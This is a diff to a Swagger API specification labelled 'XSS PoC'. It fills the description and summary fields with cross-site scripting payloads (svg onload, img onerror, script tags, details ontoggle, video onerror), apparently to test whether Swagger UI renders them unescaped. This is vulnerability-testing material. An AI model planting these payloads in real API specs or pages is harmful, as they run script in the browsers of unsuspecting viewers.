@@ -1,17 +1,23 @@
 swagger: "2.0"
 info:
-  title: "XSS PoC"
-  description: "<img src=x onerror=alert('XSS')>"
+  title: "XSS PoC 🚨"
+  description: |
+    <svg/onload=alert('XSS')>
+    <img src=x onerror=alert('XSS')>
+    <script>alert(1)</script>
+    <details open ontoggle=alert(1)>
+    <video><source onerror="alert('XSS')">
+
   version: "1.0.0"
-host: "example.com"
+host: example.com
+basePath: /
 schemes:
   - https
 paths:
   /test:
     get:
       summary: "<svg onload=alert('XSS')>"
-      description: "This is a test endpoint with XSS PoC"
-      parameters: []
+      description: "Testing reflected XSS via Swagger UI"
       responses:
-        '200':
-          description: "Successful response"
+        200:
+          description: "Success"
